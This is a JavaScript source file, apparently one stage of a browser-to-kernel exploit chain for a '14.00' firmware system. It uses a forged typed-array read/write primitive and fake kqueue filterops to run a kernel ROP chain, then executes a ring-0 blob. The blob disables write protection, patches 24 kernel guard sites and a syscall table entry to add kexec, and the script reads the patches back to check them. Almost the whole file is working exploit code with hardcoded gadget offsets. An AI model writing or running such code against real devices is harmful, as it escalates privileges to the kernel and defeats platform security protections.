// Stage PATCH v1: apply the reviewed 14.00 kernel patch set (pkb.bin).
//
// stage_guard_read_v1 read all 24 guard sites and they matched the recorded
// stock bytes exactly, so the table and the kbase are validated. This probe
// applies the 632-byte ring-0 patch blob that was statically reviewed:
//
//   1. kbase = LSTAR - 0x1c0 (the blob re-derives it; we only use ours to
//      verify the result),
//   2. clear CR0.WP, patch the 24 guard sites, patch sysent[11]
//      (sy_narg=2, sy_call=kbase+0x250be, +0x1102dac=1), write the kexec
//      handler body at 0x125791..0x125871, restore CR0.WP,
//   3. xor eax,eax; ret.
//
// The blob is spliced into the ROP chain the same way stage_exec_v1 spliced
// its stub: SAVE's ret lands on the RWX page, the blob runs in ring 0, and its
// ret falls through into kb1 which restores the user context.
//
// Safety: before executing, the probe reads and checks the stock preconditions
// (guard 0 = 0x72, guard 23 = 55 48 89 e5, sy_narg != 2, sy_call != kexec).
// If any check fails it does not execute. After executing it reads the patched
// sites back.
var result, n, f, dv, saved, phase = "preflight";
var st = null, jit = null, fake = 0, ops = 0, gSTACK = 0, gRES = 0;
var gMARK = 0, gCTX = 0, gDUMP = 0, rwx = 0;
var forged = null, carrier = null, carrierSlot = -1, carrierOriginal = null;
var KBASE_LO = 0;
var R_RET0 = 0x349ee, R_TOUCH = 0x73e886;
var R_POPRSP = 0x1c9dc, R_SAVE = 0x2be040, R_REST = 0x2be070;
var R_CONT = 0xe4f40, R_PRAX = 0x1ca05, R_PRDX = 0x184ab2;
var R_PRDI = 0x3b0a2a, R_LDRAX = 0x6aaf3, R_ADDRAX = 0x3fc327;
var R_STRDIRAX = 0x2f1cb;
var R_SE11 = 0x1102d88, R_SNARG = 0x1102d80, R_SFLAG = 0x1102dac;
var R_KEXECG = 0x250be, R_BODY = 0x125791, R_BODYEND = 0x125871;
var Z8 = [0, 0, 0, 0, 0, 0, 0, 0];
var MARK = [49, 74, 84, 79, 79, 82, 77, 77];
var GIDENT = [49, 90, 84, 82, 80, 75, 52, 49];
var M120 = [136, 255, 255, 255, 255, 255, 255, 255];
// pkb.bin, 632 bytes, reviewed (see PROJECT_STATUS/KERNEL_STAGE_SPEC_14.md §5).
var BLOB_HEX = "@PKB_BLOB_HEX@";
var GNEW = { g0: 0xeb, g1: 0xeb, g2: 0xeb, g23: 0xc3c03148 };
try {
  n = window.__fw14NativeInvoke;
  var state = window.__fw14ArrayState;
  if (!n || !n.frame || !n.wrappers || !Number.isSafeInteger(n.frameAddress) ||
      !state || state.array[0] !== state.a || !state.view ||
      !state.ownedTypedView || !Number.isSafeInteger(state.calibratedViewBase) ||
      !Number.isInteger(state.index))
    throw new Error("caller_missing");
  st = window.__fw14StageF;
  jit = window.__fw14StageJit;
  if (!st || typeof st.fake !== "number" || typeof st.ops !== "number" ||
      typeof st.gSTACK !== "number" || typeof st.gMARK !== "number" ||
      typeof st.gCTX !== "number")
    throw new Error("stage_f_state_missing");
  if (!jit || typeof jit.addr !== "number" || jit.addr <= 0)
    throw new Error("stage_jit_state_missing");
  rwx = jit.addr;
  KBASE_LO = st.kbaseLo || window.__fw14KbaseLo;
  if (!Number.isInteger(KBASE_LO) || KBASE_LO <= 0 || KBASE_LO > 0xffffffff)
    throw new Error("kbase_missing");
  var need = ["kevent", "kqueue", "getpid"];
  for (var mi = 0; mi < need.length; mi++)
    if (typeof n.wrappers[need[mi]] !== "number")
      throw new Error("wrappers_missing_" + need[mi]);
  f = n.frame;
  if (f.length < 0x9020) throw new Error("frame_short");
  dv = new DataView(f.buffer, f.byteOffset, f.byteLength);
  saved = Array.from(f.subarray(0x200, 0x1000));

  fake = st.fake;
  ops = st.ops;
  gSTACK = st.gSTACK;
  gRES = st.gRES;
  gMARK = st.gMARK;
  gCTX = st.gCTX;
  gDUMP = st.gDUMP || (fake + 6400);

  forged = state.view;
  carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  function bytesAt(index, count) {
    var out = [];
    for (var i = 0; i < count; i++) out.push(forged[index + i]);
    return out;
  }
  function valueOf(bytes) {
    var v = 0;
    for (var i = bytes.length - 1; i >= 0; i--) v = v * 256 + bytes[i];
    return v;
  }
  function pointerBytes(value) {
    var out = [];
    for (var i = 0; i < 8; i++)
      out.push(Math.floor(value / Math.pow(2, i * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  carrierSlot = addressOf(carrier) - base + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  carrierOriginal = bytesAt(carrierSlot, 8);
  function setCarrier(addr) {
    var next = pointerBytes(addr);
    for (var i = 0; i < 8; i++) forged[carrierSlot + i] = next[i];
  }
  function restoreCarrier() {
    for (var i = 0; i < 8; i++)
      forged[carrierSlot + i] = carrierOriginal[i];
  }
  function poke(addr, bytes) {
    setCarrier(addr);
    for (var i = 0; i < bytes.length; i++) carrier[i] = bytes[i];
    restoreCarrier();
  }
  function peek(addr, count) {
    setCarrier(addr);
    var out = [];
    for (var i = 0; i < count; i++) out.push(carrier[i]);
    restoreCarrier();
    return out;
  }
  function pokeQ(addr, bytes) { poke(addr, bytes); }
  function peekQ(addr) { return peek(addr, 8); }
  function same(left, right) {
    if (!left || !right || left.length !== right.length) return false;
    for (var i = 0; i < left.length; i++)
      if (left[i] !== (right[i] & 255)) return false;
    return true;
  }
  function kq(rva) {
    var lo = KBASE_LO + rva;
    if (lo > 0xffffffff) throw new Error("kva_overflow_" + rva);
    return [lo & 255, (lo >>> 8) & 255, (lo >>> 16) & 255,
            (lo >>> 24) & 255, 0xff, 0xff, 0xff, 0xff];
  }
  function u64b(value) { return pointerBytes(value); }
  function isErr(r) {
    return !!r && r.value === -1 && (r.high >>> 0) === 0xffffffff;
  }
  function eTag(r) {
    if (!isErr(r)) return "v" + r.value;
    var e = n.readErrno();
    return "e" + (e === null ? r.value : e);
  }
  function hex16(bytes) {
    var out = "";
    for (var i = 7; i >= 0; i--)
      out += ("0" + (bytes[i] & 255).toString(16)).slice(-2);
    return out;
  }
  function isBytes(v) { return v && typeof v === "object" && v.length === 8; }
  function hexToBytes(hex) {
    var out = [];
    for (var i = 0; i < hex.length; i += 2)
      out.push(parseInt(hex.substr(i, 2), 16));
    return out;
  }
  function mark(m) {
    if (typeof api !== "undefined" && api && typeof api.markSync === "function")
      api.markSync(m);
  }

  var pidRes = n.call("getpid", []);
  if (pidRes.high !== 0 || pidRes.value < 1 || pidRes.value > 100000)
    throw new Error("pid_invalid");
  var pid = pidRes.value;

  // ------------------------------------------- re-install fake filterops
  phase = "ops";
  pokeQ(ops, Z8);
  pokeQ(ops + 8, kq(R_RET0));
  pokeQ(ops + 16, kq(R_RET0));
  pokeQ(ops + 24, kq(R_RET0));
  pokeQ(ops + 32, kq(R_TOUCH));
  var opsOk = same(peekQ(ops + 32), kq(R_TOUCH));

  // ------------------------------------------------ kqueue + initial add
  phase = "kqueue";
  var kqRes = n.call("kqueue", []);
  if (kqRes.value < 0) throw new Error("kqueue" + eTag(kqRes));
  var kqFd = kqRes.value;

  f.fill(0, 0x900, 0x940);
  for (var gi = 0; gi < 8; gi++) f[0x900 + gi] = GIDENT[gi];
  dv.setInt16(0x908, -23, true);
  dv.setUint16(0x90a, 1, true);
  phase = "initial_add";
  mark("pt_initial_add");
  var addRes = n.call("kevent",
    [kqFd, n.frameAddress + 0x900, 1, 0, 0, 0]);

  // ------------------------------------------------------- chain builder
  function makeChain(extra) {
    var chain = [];
    function emit(b) { chain.push(b); }
    function emitU(v) { emit(isBytes(v) ? v : u64b(v)); }
    function kb1() {
      emit(kq(R_PRAX)); emit(MARK);
      emit(kq(R_PRDI)); emitU(gMARK);
      emit(kq(R_STRDIRAX)); emitU(0);
      emit(kq(R_PRAX)); emitU(gCTX + 16);
      emit(kq(R_LDRAX)); emitU(0);
      emit(kq(R_PRDX)); emit(M120);
      emit(kq(R_ADDRAX)); emitU(0);
      emit(kq(R_PRDI)); emitU(gCTX + 8);
      emit(kq(R_STRDIRAX)); emitU(0);
      emit(kq(R_PRAX)); emit(kq(R_CONT));
      emit(kq(R_PRDI)); emitU(gCTX + 56);
      emit(kq(R_STRDIRAX)); emitU(0);
      emit(kq(R_PRDI)); emitU(gCTX);
      emit(kq(R_REST));
    }
    emit(kq(R_PRDI)); emitU(gCTX); emit(kq(R_SAVE));
    extra(emit, emitU);
    kb1();
    var bytes = [];
    for (var qi = 0; qi < chain.length; qi++)
      for (var bi = 0; bi < 8; bi++) bytes.push(chain[qi][bi]);
    if (chain.length > 112) throw new Error("chain_long_" + chain.length);
    return { bytes: bytes, qwords: chain.length };
  }
  function fire(chain) {
    poke(gSTACK, chain.bytes);
    pokeQ(gMARK, Z8);
    f.fill(0, 0x900, 0x940);
    for (var gi2 = 0; gi2 < 8; gi2++) f[0x900 + gi2] = GIDENT[gi2];
    dv.setInt16(0x908, -23, true);
    dv.setUint16(0x90a, 1, true);
    var poprsp = kq(R_POPRSP);
    for (var pi = 0; pi < 8; pi++) f[0x920 + pi] = poprsp[pi];
    var stackB = u64b(gSTACK);
    for (var si = 0; si < 8; si++) f[0x928 + si] = stackB[si];
    var rc = n.call("kevent",
      [kqFd, n.frameAddress + 0x900, 2, 0, 0, 0]);
    return { rc: rc, mark: same(peekQ(gMARK), MARK) };
  }
  function readStep(emit, emitU, src, dst) {
    emit(kq(R_PRAX)); emitU(src);
    emit(kq(R_LDRAX)); emitU(0);
    emit(kq(R_PRDI)); emitU(dst);
    emit(kq(R_STRDIRAX)); emitU(0);
  }
  function readWords(rvas) {
    var out = [];
    for (var batch = 0; batch < rvas.length; batch += 8) {
      var start = batch;
      var count = Math.min(8, rvas.length - start);
      var rRes = fire(makeChain(function (emit, emitU) {
        for (var ri = 0; ri < count; ri++)
          readStep(emit, emitU, kq(rvas[start + ri]), gDUMP + ri * 8);
      }));
      if (!rRes.mark) return { ok: false, at: start, words: out };
      for (var ri2 = 0; ri2 < count; ri2++)
        out.push(peekQ(gDUMP + ri2 * 8));
    }
    return { ok: true, at: -1, words: out };
  }
  function low32(bytes) {
    return (bytes[0] | (bytes[1] << 8) | (bytes[2] << 16) | (bytes[3] << 24)) >>> 0;
  }

  // ------------------------------------------------- 1. stock snapshot
  phase = "snapshot";
  mark("pt_snapshot");
  var SNAP = [R_BODY, R_SE11, R_SNARG, R_SFLAG, 0x4c2, 0x3be3c0, 0x1c0, R_KEXECG];
  var snap = readWords(SNAP);
  if (!snap.ok) throw new Error("snapshot_dead@" + snap.at);
  var w = snap.words;
  var g0 = w[4], g23 = w[5], entry = w[6], kexec = w[7];
  var stockOk = g0[0] === 0x72 && g0[1] === 0x69 &&
    g23[0] === 0x55 && g23[1] === 0x48 && g23[2] === 0x89 && g23[3] === 0xe5 &&
    low32(w[2]) !== 2 && !same(w[1], kq(R_KEXECG));
  var entryTag = hex16(entry);

  // ------------------------------------------- 2. write the blob to RWX
  var blob = hexToBytes(BLOB_HEX);
  phase = "blob";
  mark("pt_blob");
  poke(rwx, blob);
  var blobOk = same(peek(rwx, blob.length), blob) &&
    blob[0] === 0xb9 && blob[1] === 0x82 && blob[blob.length - 1] === 0xc3;

  // ------------------------------------------- 3. execute in ring 0
  var execOk = false;
  if (stockOk && blobOk) {
    phase = "exec";
    mark("pt_exec");
    var eRes = fire(makeChain(function (emit) {
      emit(u64b(rwx));            // SAVE's ret lands on the blob
    }));
    execOk = eRes.mark;
  }

  // ------------------------------------------- 4. read the result back
  var post = null, checks = [], passCount = 0;
  if (execOk) {
    phase = "verify";
    mark("pt_verify");
    var VER = [0x4c2, 0xacd, 0x2bd79d, 0x3be3c0,
               R_SNARG, R_SE11, R_BODY, R_BODYEND];
    var vr = readWords(VER);
    if (vr.ok) {
      post = vr.words;
      checks.push(same(post[0].slice(0, 1), [GNEW.g0]));
      checks.push(same(post[1].slice(0, 1), [GNEW.g1]));
      checks.push(same(post[2].slice(0, 1), [GNEW.g2]));
      checks.push(same(post[3].slice(0, 4), [0x48, 0x31, 0xc0, 0xc3]));
      checks.push(low32(post[4]) === 2);
      checks.push(same(post[5], kq(R_KEXECG)));
      checks.push(post[6][0] === 0xeb && post[6][1] === 0x48);
      checks.push(post[7][0] === 0xff);
      for (var ci = 0; ci < checks.length; ci++) if (checks[ci]) passCount++;
    }
  }

  // ------------------------------------------------------- outcome
  phase = "outcome";
  for (var ri3 = 0; ri3 < saved.length; ri3++) f[0x200 + ri3] = saved[ri3];
  saved = null;
  var postPid = n.call("getpid", []);
  var intact = postPid.value === pid && postPid.high === 0 &&
    state.array[0] === state.a &&
    bytesAt(carrierSlot, 8).join(",") === carrierOriginal.join(",");

  var patched = execOk && passCount === 8;
  window.__fw14StagePatch = {
    patched: patched, rwx: rwx, kbaseLo: KBASE_LO, pid: pid,
    post: post ? post.map(function (b) { return b.slice(); }) : null
  };
  result = {
    id: "stage_patch_v1",
    status: (patched && intact) ? "pass" : "fail",
    details: {
      pid: pid,
      ops: (opsOk ? "ok" : "bad") + "/kq" + kqFd + "/add" + eTag(addRes),
      stock: stockOk ? "ok" : "bad",
      entry: entryTag,
      blob: blobOk ? "ok/" + blob.length : "bad",
      exec: execOk ? "ok" : "no",
      verify: passCount + "/8",
      sysent: post ? ("narg" + low32(post[4]) + "/call" +
        hex16(post[5]).slice(-6)) : "-",
      state: patched ? "patched" : (execOk ? "partial" : "stock"),
      intact: intact
    }
  };
} catch (e) {
  result = {
    id: "stage_patch_v1",
    status: "error",
    details: { phase: phase, error: String(e).slice(0, 220) }
  };
} finally {
  try { if (forged && carrierSlot >= 0 && carrierOriginal)
    for (var ci2 = 0; ci2 < 8; ci2++)
      forged[carrierSlot + ci2] = carrierOriginal[ci2]; } catch (ignore) {}
  if (f && saved)
    for (var fi = 0; fi < saved.length; fi++) f[0x200 + fi] = saved[fi];
}
return [result];
